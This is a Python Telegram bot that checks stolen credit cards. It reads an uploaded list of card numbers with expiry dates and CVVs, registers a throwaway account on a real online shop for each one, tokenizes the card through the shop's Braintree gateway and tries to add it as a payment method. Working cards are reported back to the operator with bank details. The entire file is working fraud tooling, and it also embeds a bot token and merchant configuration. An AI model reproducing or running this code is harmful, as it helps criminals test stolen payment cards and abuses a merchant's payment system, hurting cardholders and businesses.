import requests
import telebot
import time
from telebot import types
import os
import random
from datetime import datetime
import re
import json
import base64
from bs4 import BeautifulSoup

token = '7721695960:AAFsFNtx-Nne2lKgig8HBaA2H3nyLcPAkZ8'
bot = telebot.TeleBot(token, parse_mode="HTML")
subscriber = '6775748231'

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "Only for @CODExHYPER🙄💗")
        return
    bot.reply_to(message, "Send the file now")

def get_bin_info(bin_number):
    try:
        req = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10).json()
        return {
            "brand": req.get("brand", "Unknown"),
            "card_type": req.get("type", "Unknown"),
            "level": req.get("level", "Unknown"),
            "bank": req.get("bank", "Unknown"),
            "country_name": req.get("country_name", "Unknown"),
            "country_flag": req.get("country_flag", ""),
        }
    except:
        return {
            "brand": "Unknown",
            "card_type": "Unknown",
            "level": "Unknown",
            "bank": "Unknown",
            "country_name": "Unknown",
            "country_flag": "",
        }

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "Only for @CODExHYPER🙄💗")
        return
    
    dd = 0  # Declined count
    live = 0  # Approved count
    ko = bot.reply_to(message, "Checking Your Cards...⌛").message_id
    
    # Download the uploaded file
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)
    
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            for cc in lino:
                cc = cc.strip()
                if not cc:
                    continue
                
                # Check for stop signal
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @BhonePyaeThuKitaro')
                        os.remove('stop.stop')
                        return
                
                # Split CC details
                try:
                    cc_num, mm, yy, cvc = cc.split("|")
                except ValueError:
                    dd += 1
                    last = "Decline ❌ - Invalid Format"
                    continue
                
                fullcc = f"{cc_num}|{mm}|{yy}|{cvc}"
                bin_number = cc_num[:6]
                bin_info = get_bin_info(bin_number)
                
                # Braintree checking logic starts here
                session = requests.Session()
                
                # Step 1: Get registration nonce
                headers = {
                    'authority': 'oceansgarden.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                }
                response = session.get('https://oceansgarden.com/my-account/', headers=headers)
                reg = gets(response.text, 'input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
                
                # Step 2: Register account
                mail = "cristniki" + str(random.randint(9999, 574545)) + "@gmail.com"
                headers = {
                    'authority': 'www.oceansgarden.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.oceansgarden.com',
                    'referer': 'https://www.oceansgarden.com/my-account/',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                }
                data = {
                    'email': mail,
                    'password': 'DDcc55@&',
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': 'https://www.oceansgarden.com/my-account/',
                    'wc_order_attribution_session_start_time': '2025-03-24 06:35:44',
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                    'woocommerce-register-nonce': reg,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }
                session.post('https://www.oceansgarden.com/my-account/', headers=headers, data=data)
                
                # Step 3: Get payment method page
                headers = {
                    'authority': 'www.oceansgarden.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'referer': 'https://www.oceansgarden.com/my-account/payment-methods/',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                }
                response = session.get('https://www.oceansgarden.com/my-account/add-payment-method/', headers=headers)
                
                # Extract client token and nonce
                client_token = re.search(r'var wc_braintree_client_token = \[(".*?")\]', response.text)
                pay = re.search(r'input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
                
                if client_token and pay:
                    token = client_token.group(1)
                    nonce = pay.group(1)
                    try:
                        decoded_token = base64.b64decode(token).decode('utf-8')
                        token_json = json.loads(decoded_token)
                        autho = token_json.get('authorizationFingerprint')
                    except (base64.binascii.Error, json.JSONDecodeError):
                        dd += 1
                        last = "Decline ❌ - Token Error"
                    else:
                        # Step 4: Tokenize credit card and get API response
                        headers = {
                            'Accept': '*/*',
                            'Authorization': f'Bearer {autho}',
                            'Braintree-Version': '2018-05-10',
                            'Content-Type': 'application/json',
                            'Origin': 'https://assets.braintreegateway.com',
                            'Referer': 'https://assets.braintreegateway.com',
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                            'sec-ch-ua-mobile': '?1',
                            'sec-ch-ua-platform': '"Android"',
                        }
                        json_data = {
                            'clientSdkMetadata': {
                                'source': 'client',
                                'integration': 'custom',
                                'sessionId': '7434070c-bb48-4f87-9f21-48364df5a79f',
                            },
                            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                            'variables': {
                                'input': {
                                    'creditCard': {
                                        'number': cc_num,
                                        'expirationMonth': mm,
                                        'expirationYear': yy,
                                        'cvv': cvc,
                                        'billingAddress': {
                                            'postalCode': '10001',
                                        },
                                    },
                                    'options': {
                                        'validate': False,
                                    },
                                },
                            },
                            'operationName': 'TokenizeCreditCard',
                        }
                        token_response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
                        if token_response.status_code == 200 and "data" in token_response.json() and token_response.json()["data"]["tokenizeCreditCard"]:
                            data = token_response.json()
                            token = data["data"]["tokenizeCreditCard"]["token"]
                        else:
                            # Extract reason from API response
                            reason = "Unknown Error"
                            if "errors" in token_response.json() and token_response.json()["errors"]:
                                reason = token_response.json()["errors"][0].get("message", "Unknown Error")
                            if "CVV" in reason.upper():  # Case-insensitive check
                                last = "Approved ✅ - CVV Issue"
                                live += 1
                            else:
                                last = f"Decline ❌ - {reason}"
                                dd += 1
                            token = None
                        
                        if token:
                            # Step 5: Add payment method
                            headers = {
                                'authority': 'www.oceansgarden.com',
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                                'cache-control': 'max-age=0',
                                'content-type': 'application/x-www-form-urlencoded',
                                'origin': 'https://www.oceansgarden.com',
                                'referer': 'https://www.oceansgarden.com/my-account/add-payment-method/',
                                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                                'sec-ch-ua-mobile': '?1',
                                'sec-ch-ua-platform': '"Android"',
                                'sec-fetch-dest': 'document',
                                'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'same-origin',
                                'upgrade-insecure-requests': '1',
                                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                            }
                            data = {
                                'payment_method': 'braintree_cc',
                                'braintree_cc_nonce_key': token,
                                'braintree_cc_device_data': '{"device_session_id":"1177252d63735a15bcef39bef533e807","fraud_merchant_id":null,"correlation_id":"7ee406e4-6159-4cb1-880b-d321bec8"}',
                                'braintree_cc_3ds_nonce_key': '',
                                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/58drhv2hmcwc738y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/58drhv2hmcwc738y"},"merchantId":"58drhv2hmcwc738y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"58drhv2hmcwc738y","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Saltwaterfish.com","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDI4ODY2NDEsImp0aSI6Ijg4ODMxYWE2LTdhMTAtNDMyNy04ZjlhLTVhMTAyZmIxY2I5NiIsInN1YiI6IjU4ZHJodjJobWN3YzczOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjU4ZHJodjJobWN3YzczOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.DlIDdMH0wPjVTU0syoe9B2I2MexNo64IHyfPqBt1AVbsc6JWbtuBYIeTxJ3bur5lCnnAmGA9OsfV692qeaXClg","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":false}',
                                'woocommerce-add-payment-method-nonce': nonce,
                                '_wp_http_referer': '/my-account/add-payment-method/',
                                'woocommerce_add_payment_method': '1',
                            }
                            response = session.post('https://www.oceansgarden.com/my-account/add-payment-method/', headers=headers, data=data)
                            
                            soup = BeautifulSoup(response.text, 'html.parser')
                            error_message = soup.select_one('ul.woocommerce-error.message-wrapper > li > div.message-container')
                            
                            if not error_message:
                                last = "Approved ✅ - Success"
                                live += 1
                            else:
                                # Extract reason from web response
                                reason = error_message.text.strip()
                                if "Reason:" in reason:
                                    reason = reason.split("Reason:")[1].strip()
                                if "CVV" in reason.upper():  # Case-insensitive check
                                    last = f"Approved ✅ - {reason}"
                                    live += 1
                                else:
                                    last = f"Decline ❌ - {reason}"
                                    dd += 1
                else:
                    dd += 1
                    last = "Decline ❌ - Token Extraction Failed"
                
                # Extract just the reason for the inline status
                reason_only = last.split(" - ", 1)[1] if " - " in last else last
                
                # Update Telegram message with only the reason in status
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {fullcc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"• 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ {reason_only} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ➜ [ {dd} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 👻 ➜ [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
                mes.add(cm1, status, cm3, cm4, cm5, stop)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝒃𝒚 ➜ @CODExHYPER ''', reply_markup=mes)
                
                # Send approval message
                if "Approved ✅" in last:
                    msg = f'''◆ 𝑪𝑨𝑹𝑫  ➜ {fullcc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝘾𝘼𝙍𝘿 𝘼𝘿𝘿𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 《{last.split(' - ')[1] if ' - ' in last else 'Success'}》
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝘽𝙍𝘼𝙄𝙁𝙉𝙏𝙍𝙀𝙀 𝘼𝙐𝙏𝙃
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin_number} - {bin_info['brand']} - {bin_info['card_type']}
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {bin_info['country_name']} - {bin_info['country_flag']}
◆ 𝑩𝑨𝑵𝑲 ➜ {bin_info['bank']}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @CODExHYPER
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
                    bot.reply_to(message, msg)
                
                time.sleep(1)  # Rate limiting
                
    except Exception as e:
        print(e)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @BhonePyaeThuKitaro')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass

print("+-----------------------------------------------------------------+")
bot.polling()
